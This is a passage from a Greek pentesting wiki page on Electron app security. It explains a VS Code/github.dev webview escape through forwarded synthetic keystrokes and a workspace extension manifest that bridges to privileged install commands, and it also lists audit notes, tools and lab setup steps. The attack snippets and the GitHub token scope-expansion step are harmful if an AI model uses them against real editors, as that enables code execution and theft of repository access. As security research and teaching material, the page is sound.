Σχετική ανάγνωση για ζητήματα εμπιστοσύνης στο postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: συνθετικές συντομεύσεις webview + δηλωτικά bridges εντολών επεκτάσεων

Τον Ιούνιο του 2026 εμφανίστηκε μια διαφορετική κατηγορία escape από webview του VS Code: **μη έμπιστο JavaScript μέσα σε webview σημειωματάριου/προεπισκόπησης μπορούσε να προσομοιώσει καθολικές συντομεύσεις με αυξημένα δικαιώματα**, επειδή το preload του webview προωθούσε τα δεδομένα `keydown` στο workbench του host, όπου αυτά αντιμετωπίζονταν ως πραγματική είσοδος χρήστη.<sup>[[14]](#references)</sup>

Αυτό αποτελεί μέρος μιας ευρύτερης ιστορίας επιθέσεων στα όρια εμπιστοσύνης των IDE, όπου περιεχόμενο ελεγχόμενο από το project φτάνει σε προνομιακές λειτουργίες του editor.<sup>[[19]](#references)</sup>

### Αποτυχία ορίου

Αν ένα cross-origin/sandboxed webview αντιγράφει πεδία πληκτρολογίου που ελέγχονται από τον επιτιθέμενο (`key`, `code`, `keyCode`, modifiers, `repeat`) σε ένα προνομιακό bridge `postMessage`/message-port **χωρίς να ελέγχει το `event.isTrusted`**, το JavaScript μέσα στο webview μπορεί να εκτελέσει συντομεύσεις του workbench με:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν το πρόγραμμα περιήγησης **μπλοκάρει την προσομοιωμένη πληκτρολόγηση**. Τα scripted key events συνήθως **δεν μπορούν να πληκτρολογήσουν αυθαίρετο κείμενο σε στοιχεία HTML `<input>`**, αλλά εξακολουθούν να ενεργοποιούν συντομεύσεις που χειρίζονται απευθείας το `keydown`.

### Πρακτικά μοτίβα κατάχρησης

- **Κατάχρηση UI μέσω συντομεύσεων:** στοχεύστε καθολικές συντομεύσεις, όπως την αποδοχή ειδοποιήσεων, την πλοήγηση σε παλέτες, την ενεργοποίηση του κουμπιού που έχει την εστίαση ή την κίνηση στα μενού, αντί να προσπαθήσετε να πληκτρολογήσετε εντολές.
- **Προβλέψιμες προνομιακές προτροπές μέσω μεταδεδομένων workspace:** ένα αρχείο `.vscode/extensions.json` που ελέγχεται από το repository μπορεί να προτείνει ένα attacker extension και να δημιουργήσει μια προβλέψιμη ειδοποίηση εγκατάστασης, η οποία μπορεί να γίνει αποδεκτή με μια συντόμευση όπως `Ctrl+Shift+A`.
- **Declarative extension manifest ως γέφυρα εντολών:** ακόμη κι αν ο κώδικας μιας τοπικής επέκτασης workspace μπλοκάρεται από το CSP στο web VS Code, οι declarative συνεισφορές του `package.json` ενδέχεται να εξακολουθούν να φορτώνονται. Μια τοπική επέκταση στο `.vscode/extensions` μπορεί να καταχωρίσει ένα keybinding που καλεί το `runCommands` και έπειτα μια προνομιακή εσωτερική εντολή, όπως το `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Παράδειγμα μοτίβου manifest:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Κρυφές σημαίες ασφαλείας προσβάσιμες μέσω μη έμπιστων μεταδεδομένων:** αν η εσωτερική εντολή δέχεται ορίσματα που ελέγχονται από εισβολέα, όπως `{"context":{"skipPublisherTrust":true}}`, τα δηλωτικά μεταδεδομένα μπορούν να παρακάμψουν ένα παράθυρο διαλόγου εμπιστοσύνης και να εγκαταστήσουν μια επέκταση που φιλοξενείται στο Marketplace/CDN και τελικά εκτελεί κώδικα εισβολέα.
- **Κατάχρηση έμπιστων χώρων εργασίας:** αν οι απομακρυσμένοι/διαδικτυακοί χώροι εργασίας θεωρούνται αυτόματα έμπιστοι, οι επεκτάσεις τοπικών χώρων εργασίας αποτελούν πολύτιμη γέφυρα από το περιεχόμενο του αποθετηρίου σε προνομιούχες ενέργειες του editor.
- **Διεύρυνση του πεδίου μετά την παραβίαση:** μετά την εκτέλεση της επέκτασης, εξετάστε ποια tokens του editor είναι διαθέσιμα στις επεκτάσεις. Στο `github.dev`, το κλεμμένο GitHub token ίσχυε πέρα από το ανοιχτό αποθετήριο, επομένως το αίτημα προς το `https://api.github.com/user/repos` απαρίθμησε επιπλέον προσβάσιμα ιδιωτικά αποθετήρια.

### Σημειώσεις ελέγχου

- Αντιμετωπίστε την **προώθηση εισόδου από webview προς host** ως όριο προνομίων· μην προωθείτε ποτέ συνθετικά συμβάντα πλήκτρων/κλικ από μη έμπιστα frames στον host.
- Επιβάλλετε την εξουσιοδότηση **μέσα** στις ευαίσθητες εντολές. Μην αποδέχεστε περιβάλλον εντολής που παρέχει ο καλών και μπορεί να ορίσει εσωτερικές σημαίες, όπως `skipPublisherTrust`.
- Μην υποθέτετε ότι αρκεί ο αποκλεισμός εκτελέσιμου τοπικού κώδικα επεκτάσεων· ελέγξτε επίσης τις **δηλωτικές συνεισφορές** (`keybindings`, `menus`, `commands`, tasks) από manifests που ελέγχονται από τον χώρο εργασίας.
- Οι διορθώσεις της 3ης Ιουνίου 2026 πρόσθεσαν το `isTrusted` στα προωθούμενα συμβάντα, απενεργοποίησαν την προώθηση μη έμπιστων πλήκτρων σε notebook webviews και σταμάτησαν να αποδέχονται περιβάλλον εντολής εγκατάστασης που παρέχεται από τον καλούντα.<sup>[[16]](#references)[[17]](#references)</sup>

## **Εργαλεία**

Η επιμελημένη συλλογή **awesome-electronjs-hacking** παρέχει πρόσθετους πόρους έρευνας, εργαλεία και ευάλωτες εφαρμογές.<sup>[[5]](#references)</sup>

- Το [**Electronegativity**](https://github.com/doyensec/electronegativity) είναι ένα εργαλείο για τον εντοπισμό εσφαλμένων ρυθμίσεων και αντιμοτίβων ασφαλείας σε εφαρμογές βασισμένες στο Electron.
- Το [**Electrolint**](https://github.com/ksdmitrieva/electrolint) είναι ένα πρόσθετο ανοιχτού κώδικα για το VS Code για εφαρμογές Electron, το οποίο χρησιμοποιεί το Electronegativity.
- Το [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) ελέγχει για ευάλωτες βιβλιοθήκες τρίτων.
- Το [**Electro.ng**](https://electro.ng/) είναι ένα εμπορικό εργαλείο ανάλυσης ασφάλειας του Electron.

## Εργαστήρια

Στο [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) μπορείτε να βρείτε ένα εργαστήριο για την εκμετάλλευση ευάλωτων εφαρμογών Electron.<sup>[[4]](#references)</sup>

Αυτές οι εντολές θα σας βοηθήσουν να ολοκληρώσετε το εργαστήριο:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Παλαιότερη δημοσιευμένη διεύθυνση για υπάρχοντες σελιδοδείκτες: [Εφαρμογές Electron για υπολογιστές](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Η διαδρομή ολόκληρης της σελίδας ανακατευθύνει εδώ· το ιστορικό fragment δεν διατηρείται.

## References

- [1] [Phishing και συλλογή διαπιστευτηρίων σε εφαρμογές Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Αυθαίρετη ανάγνωση αρχείων στην εφαρμογή Facebook Messenger για υπολογιστές](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: Εκμετάλλευση της έλλειψης απομόνωσης περιβάλλοντος - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Workshop για hacking σύγχρονων εφαρμογών για υπολογιστές με XSS και RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - επιμελημένη λίστα πόρων σχετικά με την (αν)ασφάλεια του Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Κακή χρήση των Electron APIs: Η πρώτη επιλογή ενός επιτιθέμενου](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Payloads RCE για nodeIntegration του Electron](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE με ένα κλικ σε εφαρμογές Electron](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Οι κίνδυνοι της shell.openExternal() του Electron - πολλοί τρόποι για απομακρυσμένη εκτέλεση κώδικα](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Επιτρέψτε αυθαίρετα URL, αναμένετε αυθαίρετη εκτέλεση κώδικα](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Επίτευξη RCE σε δημοφιλές ιαπωνικό εργαλείο συνομιλίας με μια παρωχημένη δυνατότητα του Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord για υπολογιστές - Απομακρυσμένη εκτέλεση κώδικα](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - Απομακρυσμένη εκτέλεση κώδικα σε Restricted Mode (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Κλοπή GitHub Token με ένα κλικ μέσω έγχυσης συμβάντων πληκτρολογίου σε VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Ζήτημα VS Code #319593: Τα Webview μπορούν να ενεργοποιήσουν αυθαίρετες συντομεύσεις πληκτρολογίου στο κύριο workbench](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705: επιβεβαίωση ανοίγματος notebook και διακοπή αποδοχής περιβάλλοντος installExtension που παρέχεται από τον καλούντα](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813: αποκλεισμός προγραμματιστικής επαναποστολής πατημάτων πλήκτρων/κλικ από webview σε notebook webview](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / επεκτάσεις τοπικού workspace](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Πώς έκανα hacking σε κάθε σημαντικό IDE μέσα σε 2 εβδομάδες](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Pwning δημοφιλών εφαρμογών για υπολογιστές, ενώ αποκαλύπτεται νέα επιφάνεια επίθεσης στο Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Ασφάλεια του Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [webPreferences του Electron BrowserWindow](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Αντίστροφη μηχανική οτιδήποτε](https://github.com/morluto/rea)
- [24] [Ανακατασκευή τεχνουργημάτων JavaScript με το REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Ροές εργασίας εφαρμογών JavaScript μεταξύ επιπέδων με το REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
